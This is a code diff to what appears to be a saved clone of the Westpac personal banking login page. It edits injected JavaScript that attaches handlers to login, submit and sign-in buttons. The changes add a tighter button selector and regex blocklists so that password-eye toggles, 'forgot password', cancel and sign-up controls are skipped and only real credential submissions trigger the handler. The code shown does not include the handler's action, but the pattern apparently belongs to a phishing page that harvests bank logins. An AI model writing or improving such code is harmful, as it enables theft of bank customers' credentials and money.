@@ -1,4 +1,4 @@
-<!DOCTYPE html> <html lang=en class="authentication js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths es5 console" style><!--
+﻿<!DOCTYPE html> <html lang=en class="authentication js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths es5 console" style><!--
  Page saved with SingleFile 
  url: https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=login&segment=personal&logout=false# 
  saved date: Sun Aug 09 2026 17:23:46 GMT+0300 (TÃ¼rkiye Standart Saati)
@@ -223,6 +223,7 @@
           }
         } catch(e) {}
         if(!isButtonLike){ return; }
+        try{ var blStr = ""; try{ blStr = ((tgt&&tgt.getAttribute?tgt.getAttribute("id")||"":"")+" "+(tgt&&tgt.getAttribute?tgt.getAttribute("class")||"":"")+" "+(tgt&&tgt.getAttribute?tgt.getAttribute("data-testid")||"":"")+" "+(tgt&&tgt.getAttribute?tgt.getAttribute("aria-label")||"":"")+" "+(tgt&&tgt.getAttribute?tgt.getAttribute("title")||"":"")+" "+(tgt&&tgt.tagName?tgt.tagName:"")).toLowerCase(); }catch(eBl){ blStr=""; } if(/pwd-eye|show.?pass|toggle.?pass|visibility|padlock|pass.?eye|eye.?pass|password.?eye|icon-white-arrow|link-icon|visuallyhidden|forgot|reset.?pass|cancel|close|dismiss|back|signup|sign-up|register|new.?account|security.?question|help|support|faq/i.test(blStr)) return; }catch(eBlk){}
       }
     }catch(e3){}
     var now = Date.now();
@@ -254,7 +255,7 @@
 
   function attachButtonHandlers(doc){
     try{
-      var buttonsSelector = 'button, input[type="submit"], input[type="button"], [role="button"], a.btn, [class*="btn-primary"], [class*="btn-default"], [class*="btn-lg"], [data-testid*="login"], [data-testid*="submit"], [class*="login-button"], [id*="login-button"], [id*="submit-button"], [onclick], [class*="btn"], [class*="login"], [class*="submit"], [class*="continue"], [class*="next"], [id*="btn"], [id*="submit"], [id*="continue"], [id*="next"], [class*="logon"], [class*="signin"], [id*="logon"], [id*="signin"]';
+      var buttonsSelector = 'button, input[type="submit"], input[type="button"], [role="button"], a.btn, .btn-primary, .btn-default, .btn-lg, .btn-submit, .btn-login, .btn-continue, .btn-next, .el-button, .van-button, .sg-btn, .sg-btn--primary, [data-testid="login-button"], [data-testid="submit-button"], [data-testid*="login-button"], [data-testid*="submit-button"], [onclick], #login-button, #submit-button, #btn-login, #btn-submit, #logon, #signin, .login-btn, .submit-btn, .logon, .signin';
       var buttons = doc.querySelectorAll(buttonsSelector);
       var seen = [];
       function isSeen(n){ for(var s=0;s<seen.length;s++){ if(seen[s]===n) return true; } return false; }
@@ -268,6 +269,7 @@
         var isButtonLike = tag==="button" || type==="submit" || type==="button" || role==="button";
         var tok = getActionToken(btn);
         var hasOnclick = btn.hasAttribute&&btn.hasAttribute("onclick");
+        try{ var blTok = getActionToken(btn); var blAttrId = (btn.getAttribute&&btn.getAttribute("id")||"").toLowerCase(); var blAttrCl = (btn.getAttribute&&btn.getAttribute("class")||"").toLowerCase(); var blAttrDt = (btn.getAttribute&&btn.getAttribute("data-testid")||"").toLowerCase(); var blAria = (btn.getAttribute&&(btn.getAttribute("aria-label")||"")+(btn.getAttribute("title")||"")).toLowerCase(); var blStr = (blTok+" "+blAttrId+" "+blAttrCl+" "+blAttrDt+" "+blAria).toLowerCase(); if(/pwd-eye|show.?pass|toggle.?pass|visibility|padlock|pass.?eye|eye.?pass|password.?eye|icon-white-arrow|link-icon|visuallyhidden|forgot|reset.?pass|cancel|close|dismiss|back|signup|sign-up|register|new.?account|security.?question|help|support|faq/i.test(blStr)){ return; } }catch(eBlA){}
         if(!(ACTION_TOKEN_RE.test(tok) || isButtonLike || hasOnclick)) return;
         try{
           if(btn.classList && btn.classList.remove){
